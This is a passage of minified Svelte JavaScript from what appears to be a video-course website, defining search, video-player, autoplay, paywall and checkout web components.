      p(M, e, X),
        h(e, t),
        D && D.m(t, null),
        h(e, r),
        h(e, i),
        z && z.m(i, null),
        h(i, o);
      for (let re = 0; re < q.length; re += 1) q[re].m(i, null);
      h(e, s),
        h(e, a),
        h(a, l),
        h(a, c),
        h(a, d),
        h(a, u),
        h(a, f),
        h(a, m),
        h(a, y),
        h(a, I),
        h(a, v),
        h(a, R),
        h(a, L),
        h(a, _),
        h(a, P),
        te ||
          ((ne = [
            O(jm, "keydown", n[9]),
            O(l, "click", n[8]),
            O(f, "click", n[6]),
            O(y, "click", n[7]),
            O(L, "click", n[13]),
          ]),
          (te = !0));
    },
    p(M, [X]) {
      var re;
      if (
        ("search" === M[4]
          ? D
            ? D.p(M, X)
            : ((D = To(M)), D.c(), D.m(t, null))
          : D && (D.d(1), (D = null)),
        null != (re = M[1]) && re.nbHits
          ? z && (z.d(1), (z = null))
          : z || ((z = So()), z.c(), z.m(i, o)),
        12 & X)
      ) {
        let ue;
        for (B = M[2], ue = 0; ue < B.length; ue += 1) {
          const be = Eo(M, B, ue);
          q[ue]
            ? q[ue].p(be, X)
            : ((q[ue] = Co(be)), q[ue].c(), q[ue].m(i, null));
        }
        for (; ue < q.length; ue += 1) q[ue].d(1);
        q.length = B.length;
      }
    },
    i: k,
    o: k,
    d(M) {
      M && g(e), D && D.d(), z && z.d(), at(q, M), (te = !1), fe(ne);
    },
  };
}
const Bm = "05VYZFXKNM",
  Vm = "a0837b31f4379765240c2753fa141aa2";
function $m(n, e, t) {
  let r;
  ie(n, Ae, (_) => t(4, (r = _)));
  const o = Hm(Bm, Vm).initIndex("content");
  let s,
    a,
    l = [],
    c = 0;
  function u() {
    t(3, (c = c <= 0 ? c : c - 1));
  }
  function f() {
    t(3, (c = c >= l.length - 1 ? c : c + 1));
  }
  function m() {
    if (l[c]) {
      const _ = l[c].relpermalink;
      mr.go(_), Ae.set(null);
    }
  }
  function y(_) {
    "ArrowUp" === _.key && u(),
      "ArrowDown" === _.key && f(),
      "Enter" === _.key && m();
  }
  return (
    bt(
      () => (
        null == s || s.focus(),
        () => {
          window.removeEventListener("keydown", y);
        }
      )
    ),
    [
      s,
      a,
      l,
      c,
      r,
      async function d(_) {
        const P = _.target.value;
        t(
          1,
          (a = await o.search(P, {
            hitsPerPage: 7,
            attributesToSnippet: ["summary"],
            highlightPreTag: '<mark class="high">',
            highlightPostTag: "</mark>",
          }))
        ),
          t(2, (l = a.hits)),
          t(3, (c = 0));
      },
      u,
      f,
      m,
      y,
      function I(_) {
        st[_ ? "unshift" : "push"](() => {
          (s = _), t(0, s);
        });
      },
      (_) => t(3, (c = _)),
      (_) => t(3, (c = _)),
      () => Ae.set(null),
    ]
  );
}
class qm extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>a,a:hover,a:focus,a:active{text-decoration:none;color:inherit}form{overflow:hidden}.input{margin-right:0.5rem;display:block;width:100%;border-radius:0px;border-width:4px;border-top-width:0px;border-right-width:0px;border-left-width:0px;border-style:solid;--tw-border-opacity:1;border-bottom-color:rgb(168 85 247 / var(--tw-border-opacity));background-color:rgb(18 24 27 / var(--tw-bg-opacity));--tw-bg-opacity:0.5;padding:0.75rem;font-family:sofia-pro, sans-serif;font-size:1.25rem;line-height:1.75rem;--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity));outline:2px solid transparent;outline-offset:2px}.input:focus-visible{outline:2px solid transparent;outline-offset:2px}@media(min-width: 768px){.input{width:768px}}.results{min-height:200px;max-width:100%}.hit{margin-top:0.5rem;margin-bottom:0.5rem;display:block;border-width:1px;background-color:rgb(18 24 27 / var(--tw-bg-opacity));--tw-bg-opacity:0.5;padding:1rem;font-family:sofia-pro, sans-serif;-webkit-text-decoration-line:none;text-decoration-line:none;--tw-shadow:0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color), 0 2px 4px -2px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);transition-property:all;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.hit-description{display:block;font-size:0.875rem;line-height:1.25rem;--tw-text-opacity:1;color:rgb(178 190 205 / var(--tw-text-opacity))}.hit-title{font-size:1.125rem;line-height:1.75rem;font-weight:700}.hit-type{font-weight:300;--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity))}.no-results{text-align:center;font-size:0.875rem;line-height:1.25rem;--tw-text-opacity:1;color:rgb(178 190 205 / var(--tw-text-opacity))}.active{--tw-bg-opacity:1;background-color:rgb(249 115 22 / var(--tw-bg-opacity));--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity))}.active .hit-description{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity))}footer{margin-top:1.5rem;font-size:0.75rem;line-height:1rem;--tw-text-opacity:1;color:rgb(178 190 205 / var(--tw-text-opacity))}kbd{cursor:pointer;border-radius:0.375rem;border-width:1px;border-style:solid;--tw-border-opacity:1;border-color:rgb(249 115 22 / var(--tw-border-opacity));background-color:transparent;--tw-bg-opacity:0.5;padding:0.375rem;font-size:0.75rem;line-height:1rem;--tw-text-opacity:1;color:rgb(178 190 205 / var(--tw-text-opacity));transition-property:all;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}kbd:hover{--tw-bg-opacity:1;background-color:rgb(249 115 22 / var(--tw-bg-opacity));--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity))}.kbd-text{margin-right:0.75rem}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        $m,
        zm,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
customElements.define("algolia-search", qm);
class Vr {
  constructor(e, t, r) {
    ln(this, "vimeoPlayer"),
      ln(this, "ytPlayer"),
      ln(this, "listener"),
      (this.video = e),
      (this.el = t),
      (this.type = r);
  }
  async setupPlayer() {
    if ("youtube" === this.type) {
      const e = (
          await ft(() => import("./index.eac35fff.js").then((r) => r.i), [])
        ).default,
        t = atob(this.video);
      (this.ytPlayer = e(this.el)), this.ytPlayer.cueVideoById(t);
    } else {
      const e = (await ft(() => import("./player.es.ed5f24b4.js"), [])).default,
        t = parseInt(atob(this.video));
      this.vimeoPlayer = new e(this.el, { id: t });
    }
  }
  static async create(e, t, r) {
    const i = new Vr(e, t, r);
    return await i.setupPlayer(), i;
  }
  play() {
    "youtube" === this.type
      ? this.ytPlayer.playVideo()
      : this.vimeoPlayer.play();
  }
  destroy() {
    "youtube" === this.type
      ? (this.ytPlayer.off(this.listener), this.ytPlayer.destroy())
      : (this.vimeoPlayer.off("ended"), this.vimeoPlayer.destroy());
  }
  onEnded(e) {
    "youtube" === this.type
      ? (this.listener = this.ytPlayer.on("stateChange", (t) => {
          0 === t.data && e();
        }))
      : (this.listener = this.vimeoPlayer.on("ended", e));
  }
}
function Wm(n) {
  var d;
  let e,
    t,
    r,
    i,
    o,
    s,
    a,
    l,
    c = (null == (d = n[6]) ? void 0 : d.price) && Ao();
  return {
    c() {
      (e = b("div")),
        (t = b("if-user")),
        (r = b("h5")),
        (r.textContent = "Permission Denied"),
        (i = E()),
        c && c.c(),
        (o = E()),
        (s = b("div")),
        (s.innerHTML =
          '<p><a href="/pro/" class="text-pro">Upgrade to PRO</a></p> \n        <p class="text-light">Unlock all Fireship content &amp;&amp; bonus perks</p>'),
        (a = E()),
        (l = b("modal-action")),
        (l.innerHTML =
          'You must be <span class="hl-blue">signed in</span> to watch.'),
        w(r, "class", "denied"),
        w(s, "class", "buy-box green"),
        Te(l, "slot", "signed-out"),
        Te(l, "name", "signin"),
        Te(l, "type", "open"),
        w(e, "class", "upgrade-required");
    },
    m(u, f) {
      p(u, e, f),
        h(e, t),
        h(t, r),
        h(t, i),
        c && c.m(t, null),
        h(t, o),
        h(t, s),
        h(t, a),
        h(t, l);
    },
    p(u, f) {
      var m;
      null != (m = u[6]) && m.price
        ? c || ((c = Ao()), c.c(), c.m(t, o))
        : c && (c.d(1), (c = null));
    },
    d(u) {
      u && g(e), c && c.d();
    },
  };
}
function Gm(n) {
  let e, t, r, i, o, s, a, l, c, d, u, f, m, y, I, v, R;
  return {
    c() {
      (e = b("div")),
        (t = b("div")),
        (r = E()),
        (i = b("div")),
        (o = b("p")),
        (s = A("Autoplaying next video in ")),
        (a = b("span")),
        (l = A(n[3])),
        (c = A(" seconds...")),
        (d = E()),
        (u = b("div")),
        (f = b("button")),
        (f.textContent = "Cancel"),
        (m = E()),
        (y = b("button")),
        (y.textContent = "Go"),
        (I = E()),
        w(t, "class", "vid"),
        w(a, "class", "big-text"),
        w(f, "class", "btn"),
        w(y, "class", "btn btn-blue"),
        w(i, "class", "autoplay-cover"),
        Z(i, "active", n[2]),
        w(e, "class", "wrapper");
    },
    m(L, _) {
      p(L, e, _),
        h(e, t),
        n[11](t),
        h(e, r),
        h(e, i),
        h(i, o),
        h(o, s),
        h(o, a),
        h(a, l),
        h(o, c),
        h(i, d),
        h(i, u),
        h(u, f),
        h(u, m),
        h(u, y),
        h(e, I),
        v || ((R = [O(f, "click", n[7]), O(y, "click", n[12])]), (v = !0));
    },
    p(L, _) {
      8 & _ && U(l, L[3]), 4 & _ && Z(i, "active", L[2]);
    },
    d(L) {
      L && g(e), n[11](null), (v = !1), fe(R);
    },
  };
}
function Ao(n) {
  let e, t, r;
  return {
    c() {
      (e = b("div")),
        (e.innerHTML =
          '<buy-course></buy-course> \n          <p class="text-light">Lifetime access for a blazingly low price</p>'),
        (t = E()),
        (r = b("h3")),
        (r.textContent = "OR"),
        w(e, "class", "buy-box");
    },
    m(i, o) {
      p(i, e, o), p(i, t, o), p(i, r, o);
    },
    d(i) {
      i && g(e), i && g(t), i && g(r);
    },
  };
}
function Km(n) {
  let e;
  function t(o, s) {
    return o[0] || o[5] ? Gm : Wm;
  }
  let r = t(n),
    i = r(n);
  return {
    c() {
      i.c(), (e = ee()), (this.c = k);
    },
    m(o, s) {
      i.m(o, s), p(o, e, s);
    },
    p(o, [s]) {
      r === (r = t(o)) && i
        ? i.p(o, s)
        : (i.d(1), (i = r(o)), i && (i.c(), i.m(e.parentNode, e)));
    },
    i: k,
    o: k,
    d(o) {
      i.d(o), o && g(e);
    },
  };
}
function Ym(n, e, t) {
  let r, i, o, s;
  ie(n, Rn, (D) => t(4, (r = D))),
    ie(n, Qt, (D) => t(17, (i = D))),
    ie(n, Zt, (D) => t(5, (o = D))),
    ie(n, Ga, (D) => t(6, (s = D)));
  let u,
    f,
    y,
    I,
    R,
    { video: a } = e,
    { type: l } = e,
    { free: c = !1 } = e,
    { single: d = !1 } = e,
    m = !1,
    v = 10;
  bt(() => {
    t(
      8,
      a ||
        (a = (null == r ? void 0 : r.vimeo) || (null == r ? void 0 : r.youtube))
    ),
      t(9, (l = null != r && r.vimeo ? "vimeo" : "youtube"));
    const D = Zt.subscribe(async (z) => {
      a &&
        !R &&
        (z || c) &&
        (await gl(),
        (async function L() {
          R = await Vr.create(a, u, l);
          const D = window.location.search.includes("autoplay");
          (f = Qt.subscribe((z) => {
            z && D && R.play();
          })),
            R.onEnded(() => {
              !d &&
                i &&
                (null == r ? void 0 : r.next) &&
                (t(2, (m = !0)),
                (function _() {
                  clearInterval(I),
                    (I = setInterval(() => {
                      t(3, v--, v);
                    }, 1e3));
                })(),
                (y = setTimeout(() => {
                  mr.go(r.next + "?autoplay=true");
                }, 1e4))),
                !d &&
                  (null == r || !r.next) &&
                  me.set({
                    message: "Well done! You reached the end of this course.",
                    type: "success",
                    icon: "🍰",
                  });
            });
        })());
    });
    return () => {
      null == R || R.destroy(),
        y && clearTimeout(y),
        I && clearInterval(I),
        f && f(),
        D();
    };
  });
  return (
    (n.$$set = (D) => {
      "video" in D && t(8, (a = D.video)),
        "type" in D && t(9, (l = D.type)),
        "free" in D && t(0, (c = D.free)),
        "single" in D && t(10, (d = D.single));
    }),
    [
      c,
      u,
      m,
      v,
      r,
      o,
      s,
      function P() {
        t(2, (m = !1)), t(3, (v = 10)), clearTimeout(y), clearInterval(I);
      },
      a,
      l,
      d,
      function te(D) {
        st[D ? "unshift" : "push"](() => {
          (u = D), t(1, u);
        });
      },
      () => mr.go(r.next + "?autoplay=true"),
    ]
  );
}
class Jm extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>.wrapper{position:relative;aspect-ratio:16 / 9;width:100%;background-color:rgb(0 0 0 / var(--tw-bg-opacity));--tw-bg-opacity:0.5\n}.autoplay-cover{position:absolute;top:0px;right:0px;bottom:0px;left:0px;display:none;flex-direction:column;align-items:center;justify-content:center;background-color:rgb(0 0 0 / var(--tw-bg-opacity));--tw-bg-opacity:0.95;font-size:1.125rem;line-height:1.75rem\n}.active{display:flex\n}.btn{margin-left:0.25rem;margin-right:0.25rem;cursor:pointer;border-style:none;--tw-bg-opacity:1;background-color:rgb(239 68 68 / var(--tw-bg-opacity));padding-left:1rem;padding-right:1rem;padding-top:0.5rem;padding-bottom:0.5rem;font-family:cubano, sans-serif;--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity));outline:2px solid transparent;outline-offset:2px\n}.btn-blue{--tw-bg-opacity:1;background-color:rgb(59 130 246 / var(--tw-bg-opacity))\n}.upgrade-required{display:flex;aspect-ratio:16 / 9\n}@keyframes pulse{50%{opacity:.5\n    }}.upgrade-required{animation:pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;flex-direction:column;align-items:center;justify-content:center;background-color:rgb(0 0 0 / var(--tw-bg-opacity));--tw-bg-opacity:0.75;text-align:center;font-size:1.25rem;line-height:1.75rem\n}.hl-blue{cursor:pointer;font-family:cubano, sans-serif;--tw-text-opacity:1;color:rgb(59 130 246 / var(--tw-text-opacity))\n}.denied{display:none;--tw-text-opacity:1;color:rgb(239 68 68 / var(--tw-text-opacity))\n}@media(min-width: 768px){.denied{display:block\n    }}.big-text{font-family:cubano, sans-serif;font-size:2.25rem;line-height:2.5rem\n}.buy-box{margin-left:auto;margin-right:auto;max-width:24rem;border-radius:0.5rem;border-width:1px;border-style:solid;--tw-border-opacity:1;border-color:rgb(59 130 246 / var(--tw-border-opacity));--tw-bg-opacity:1;background-color:rgb(18 24 27 / var(--tw-bg-opacity));padding:1.5rem;--tw-shadow:0 5px 20px rgb(0 0 0 / 30%);--tw-shadow-colored:0 5px 20px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)\n}.buy-box.green{margin-top:1rem;--tw-border-opacity:1;border-color:rgb(34 197 94 / var(--tw-border-opacity))\n}.buy-box p{margin-top:0px;margin-bottom:0px\n}.text-light{margin-top:0px;font-size:0.875rem;line-height:1.25rem;--tw-text-opacity:1;color:rgb(108 121 131 / var(--tw-text-opacity))\n}.text-pro{font-family:cubano, sans-serif;font-size:1.25rem;line-height:1.75rem;--tw-text-opacity:1;color:rgb(34 197 94 / var(--tw-text-opacity));-webkit-text-decoration-line:none;text-decoration-line:none\n}h3{display:none;font-family:cubano, sans-serif;--tw-text-opacity:1;color:rgb(108 121 131 / var(--tw-text-opacity))\n}@media(min-width: 768px){h3{display:block\n    }}iframe{position:absolute;top:0px;left:0px;height:100%;width:100%\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        Ym,
        Km,
        G,
        { video: 8, type: 9, free: 0, single: 10 },
        null
      ),
      e &&
        (e.target && p(e.target, this, e.anchor),
        e.props && (this.$set(e.props), W()));
  }
  static get observedAttributes() {
    return ["video", "type", "free", "single"];
  }
  get video() {
    return this.$$.ctx[8];
  }
  set video(e) {
    this.$$set({ video: e }), W();
  }
  get type() {
    return this.$$.ctx[9];
  }
  set type(e) {
    this.$$set({ type: e }), W();
  }
  get free() {
    return this.$$.ctx[0];
  }
  set free(e) {
    this.$$set({ free: e }), W();
  }
  get single() {
    return this.$$.ctx[10];
  }
  set single(e) {
    this.$$set({ single: e }), W();
  }
}
function Xm(n) {
  let e, t, r, i, o, s;
  return {
    c() {
      (e = b("label")),
        (t = b("input")),
        (r = E()),
        (i = b("span")),
        (this.c = k),
        w(t, "type", "checkbox"),
        (t.checked = n[0]),
        w(i, "class", "slider"),
        w(e, "class", "switch");
    },
    m(a, l) {
      p(a, e, l),
        h(e, t),
        h(e, r),
        h(e, i),
        o || ((s = O(t, "change", n[1])), (o = !0));
    },
    p(a, [l]) {
      1 & l && (t.checked = a[0]);
    },
    i: k,
    o: k,
    d(a) {
      a && g(e), (o = !1), s();
    },
  };
}
function Zm(n, e, t) {
  let r;
  return (
    ie(n, Qt, (o) => t(0, (r = o))),
    [
      r,
      function i(o) {
        Qt.set(o.target.checked);
      },
    ]
  );
}
customElements.define("video-player", Jm);
class Qm extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        '<style>.switch{position:relative;display:inline-block;height:1.25rem;width:2.5rem\n}.switch input{height:0px;width:0px;opacity:0\n}.slider{position:absolute;top:0px;right:0px;bottom:0px;left:0px;cursor:pointer;border-radius:9999px;--tw-bg-opacity:1;background-color:rgb(69 78 86 / var(--tw-bg-opacity));transition-property:all;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms\n}.slider:before{position:absolute;left:0.125rem;bottom:0.125rem;z-index:10;height:1rem;width:1rem;border-radius:9999px;--tw-bg-opacity:1;background-color:rgb(18 24 27 / var(--tw-bg-opacity));transition-property:all;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms;content:""\n}input:checked+.slider{--tw-bg-opacity:1;background-color:rgb(34 197 94 / var(--tw-bg-opacity))\n}input:focus+.slider{--tw-shadow:0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color), 0 2px 4px -2px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)\n}input:checked+.slider:before{--tw-translate-x:1.25rem;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))\n}</style>'),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        Zm,
        Xm,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
function eg(n) {
  let e;
  return {
    c() {
      (e = b("span")),
        (e.textContent = "Course not available for single purchase"),
        w(e, "class", "btn yellow");
    },
    m(t, r) {
      p(t, e, r);
    },
    p: k,
    d(t) {
      t && g(e);
    },
  };
}
function tg(n) {
  var y;
  let e,
    t,
    i,
    o,
    s,
    a,
    c,
    d,
    u,
    f,
    r = n[0] ? "loading..." : "buy this course",
    l = (null == (y = n[2]) ? void 0 : y.amount) + "",
    m = n[0] && Ro();
  return {
    c() {
      (e = b("span")),
        m && m.c(),
        (t = E()),
        (i = A(r)),
        (o = A(" \n      for ")),
        (s = b("strong")),
        (a = A("$")),
        (c = A(l)),
        (d = A(".")),
        w(e, "class", "btn"),
        w(s, "class", "font-display");
    },
    m(I, v) {
      p(I, e, v),
        m && m.m(e, null),
        h(e, t),
        h(e, i),
        p(I, o, v),
        p(I, s, v),
        h(s, a),
        h(s, c),
        p(I, d, v),
        u || ((f = O(e, "click", n[3])), (u = !0));
    },
    p(I, v) {
      var R;
      I[0] ? m || ((m = Ro()), m.c(), m.m(e, t)) : m && (m.d(1), (m = null)),
        1 & v && r !== (r = I[0] ? "loading..." : "buy this course") && U(i, r),
        4 & v &&
          l !== (l = (null == (R = I[2]) ? void 0 : R.amount) + "") &&
          U(c, l);
    },
    d(I) {
      I && g(e), m && m.d(), I && g(o), I && g(s), I && g(d), (u = !1), f();
    },
  };
}
function Ro(n) {
  let e;
  return {
    c() {
      e = b("loading-spinner");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function Po(n) {
  let e, t;
  return {
    c() {
      (e = b("a")),
        (t = A("Open Checkout Page")),
        w(e, "target", "_blank"),
        w(e, "href", n[1]);
    },
    m(r, i) {
      p(r, e, i), h(e, t);
    },
    p(r, i) {
      2 & i && w(e, "href", r[1]);
    },
    d(r) {
      r && g(e);
    },
  };
}
function ng(n) {
  let e, t;
  function r(a, l) {
    var c;
    return null != (c = a[2]) && c.price ? tg : eg;
  }
  let i = r(n),
    o = i(n),
    s = n[1] && Po(n);
  return {
    c() {
      o.c(), (e = E()), s && s.c(), (t = ee()), (this.c = k);
    },
    m(a, l) {
      o.m(a, l), p(a, e, l), s && s.m(a, l), p(a, t, l);
    },
    p(a, [l]) {
      i === (i = r(a)) && o
        ? o.p(a, l)
        : (o.d(1), (o = i(a)), o && (o.c(), o.m(e.parentNode, e))),
        a[1]
          ? s
            ? s.p(a, l)
            : ((s = Po(a)), s.c(), s.m(t.parentNode, t))
          : s && (s.d(1), (s = null));
    },
    i: k,
    o: k,
    d(a) {
      o.d(a), a && g(e), s && s.d(a), a && g(t);
    },
  };
}
function rg(n, e, t) {
  let r;
  ie(n, Ga, (a) => t(2, (r = a)));
  let o,
    i = !1;
  return [
    i,
    o,
    r,
    async function s() {
      var a;
      t(0, (i = !0)),
        t(
          1,
          (o = await ge({
            fn: "createPaymentSession",
            payload: { productId: r.id, price: r.price, productType: "course" },
          }))
        ),
        o && (null == (a = window.open(o, "_blank")) || a.focus()),
        t(0, (i = !1));
    },
  ];
}
customElements.define("autoplay-toggle", Qm);
class ig extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>.btn{cursor:pointer;font-family:cubano, sans-serif;font-size:1.25rem;line-height:1.75rem;--tw-text-opacity:1;color:rgb(59 130 246 / var(--tw-text-opacity))\n}.btn.yellow{cursor:default;--tw-text-opacity:1;color:rgb(234 179 8 / var(--tw-text-opacity))\n}a{display:block;text-align:center;font-size:0.875rem;line-height:1.25rem;--tw-text-opacity:1;color:rgb(59 130 246 / var(--tw-text-opacity))\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        rg,
        ng,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
function xo(n) {
  let e;
  return {
    c() {
      e = b("loading-spinner");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function Oo(n) {
  let e, t;
  return {
    c() {
      (e = b("a")),
        (t = A("Open Checkout Page")),
        w(e, "target", "_blank"),
        w(e, "href", n[1]);
    },
    m(r, i) {
      p(r, e, i), h(e, t);
    },
    p(r, i) {
      2 & i && w(e, "href", r[1]);
    },
    d(r) {
      r && g(e);
    },
  };
}
function og(n) {
  let e,
    t,
    i,
    o,
    s,
    a,
    l,
    r = n[0] ? "loading..." : "subscribe",
    c = n[0] && xo(),
    d = n[1] && Oo(n);
  return {
    c() {
      (e = b("button")),
        c && c.c(),
        (t = E()),
        (i = A(r)),
        (o = E()),
        d && d.c(),
        (s = ee()),
        (this.c = k),
        w(e, "class", "btn btn-blue"),
        (e.disabled = n[0]);
    },
    m(u, f) {
      p(u, e, f),
        c && c.m(e, null),
        h(e, t),
        h(e, i),
        p(u, o, f),
        d && d.m(u, f),
        p(u, s, f),
        a || ((l = O(e, "click", n[2])), (a = !0));
    },
    p(u, [f]) {
      u[0] ? c || ((c = xo()), c.c(), c.m(e, t)) : c && (c.d(1), (c = null)),
        1 & f && r !== (r = u[0] ? "loading..." : "subscribe") && U(i, r),
        1 & f && (e.disabled = u[0]),
        u[1]
          ? d
            ? d.p(u, f)
            : ((d = Oo(u)), d.c(), d.m(s.parentNode, s))
          : d && (d.d(1), (d = null));
    },
    i: k,
    o: k,
    d(u) {
      u && g(e), c && c.d(), u && g(o), d && d.d(u), u && g(s), (a = !1), l();
    },
  };
}
function sg(n, e, t) {
  let r;
  ie(n, Vt, (a) => t(3, (r = a)));
  let o,
    i = !1;
  return [
    i,
    o,
    async function s() {
      var l;
      t(0, (i = !0));
      const a = Ot[r].price;
      t(
        1,
        (o = await ge({
          fn: "createSubscriptionSession",
          payload: { price: a },
        }))
      ),
        o && (null == (l = window.open(o, "_blank")) || l.focus()),
        t(0, (i = !1));
    },
  ];
}
customElements.define("buy-course", ig);
class ag extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>.btn{margin-top:0.125rem;margin-bottom:0.125rem;display:inline-flex;cursor:pointer;border-style:none;--tw-bg-opacity:1;background-color:rgb(59 130 246 / var(--tw-bg-opacity));padding-left:1.25rem;padding-right:1.25rem;padding-top:0.5rem;padding-bottom:0.5rem;text-align:center;font-family:sofia-pro, sans-serif;font-size:0.875rem;line-height:1.25rem;font-weight:700;text-transform:uppercase;--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity));-webkit-text-decoration-line:none;text-decoration-line:none;--tw-shadow:0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color), 0 2px 4px -2px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);outline:2px solid transparent;outline-offset:2px\n}.btn:hover{--tw-bg-opacity:1;background-color:rgb(29 78 216 / var(--tw-bg-opacity))\n}.btn:disabled{cursor:not-allowed;opacity:0.7\n}a{display:block;text-align:center;font-size:0.875rem;line-height:1.25rem;--tw-text-opacity:1;color:rgb(59 130 246 / var(--tw-text-opacity))\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        sg,
        og,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
function Lo(n) {
  let e, t, r, i, o, s, a, l;
  return {
    c() {
      (e = b("div")),
        (t = b("button")),
        (t.textContent = "-"),
        (r = E()),
        (i = b("input")),
        (o = E()),
        (s = b("button")),
        (s.textContent = "+"),
        w(t, "class", "btn-o"),
        w(i, "type", "number"),
        w(i, "min", "5"),
        w(i, "max", "50"),
        w(s, "class", "btn-o"),
        w(e, "class", "controls");
    },
    m(c, d) {
      p(c, e, d),
        h(e, t),
        h(e, r),
        h(e, i),
        de(i, n[2]),
        h(e, o),
        h(e, s),
        a ||
          ((l = [
            O(t, "click", n[7]),
            O(i, "input", n[8]),
            O(i, "change", n[9]),
            O(s, "click", n[10]),
          ]),
          (a = !0));
    },
    p(c, d) {
      4 & d && Ts(i.value) !== c[2] && de(i, c[2]);
    },
    d(c) {
      c && g(e), (a = !1), fe(l);
    },
  };
}
function No(n) {
  let e;
  return {
    c() {
      e = b("loading-spinner");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function Mo(n) {
  let e, t;
  return {
    c() {
      (e = b("a")),
        (t = A("Open Checkout Page")),
        w(e, "target", "_blank"),
        w(e, "href", n[3]);
    },
    m(r, i) {
      p(r, e, i), h(e, t);
    },
    p(r, i) {
      8 & i && w(e, "href", r[3]);
    },
    d(r) {
      r && g(e);
    },
  };
}
function lg(n) {
  let e,
    t,
    r,
    o,
    s,
    a,
    l,
    c,
    i = (n[1] ? "loading..." : n[4]) + "",
    d = n[0] && Lo(n),
    u = n[1] && No(),
    f = n[3] && Mo(n);
  return {
    c() {
      d && d.c(),
        (e = E()),
        (t = b("button")),
        u && u.c(),
        (r = E()),
        (o = A(i)),
        (s = E()),
        f && f.c(),
        (a = ee()),
        (this.c = k),
        w(t, "class", "btn"),
        (t.disabled = n[1]),
        Z(t, "btn-blue", n[0]);
    },
    m(m, y) {
      d && d.m(m, y),
        p(m, e, y),
        p(m, t, y),
        u && u.m(t, null),
        h(t, r),
        h(t, o),
        p(m, s, y),
        f && f.m(m, y),
        p(m, a, y),
        l || ((c = O(t, "click", n[6])), (l = !0));
    },
    p(m, [y]) {
      m[0]
        ? d
          ? d.p(m, y)
          : ((d = Lo(m)), d.c(), d.m(e.parentNode, e))
        : d && (d.d(1), (d = null)),
        m[1] ? u || ((u = No()), u.c(), u.m(t, r)) : u && (u.d(1), (u = null)),
        2 & y && i !== (i = (m[1] ? "loading..." : m[4]) + "") && U(o, i),
        2 & y && (t.disabled = m[1]),
        1 & y && Z(t, "btn-blue", m[0]),
        m[3]
          ? f
            ? f.p(m, y)
            : ((f = Mo(m)), f.c(), f.m(a.parentNode, a))
          : f && (f.d(1), (f = null));
    },
    i: k,
    o: k,
    d(m) {
      d && d.d(m),
        m && g(e),
        m && g(t),
        u && u.d(),
        m && g(s),
        f && f.d(m),
        m && g(a),
        (l = !1),
        c();
    },
  };
}
function cg(n, e, t) {
  let r = !1,
    { enterprise: i = !1 } = e,
    o = i ? "upgrade my team" : "upgrade for life",
    s = i ? Ot.enterprise.price : Ot.lifetime.price,
    a = 5,
    l = "";
  function c(I) {
    t(2, (a = I)),
      a < 5 &&
        (t(2, (a = 5)),
        me.set({ message: "This plan has a 5 seat minimum", type: "error" })),
      a > 50 &&
        (t(2, (a = 50)),
        me.set({
          message: "Maximum 50 seats. Contact for larger plans",
          type: "error",
        }));
  }
  return (
    (n.$$set = (I) => {
      "enterprise" in I && t(0, (i = I.enterprise));
    }),
    [
      i,
      r,
      a,
      l,
      o,
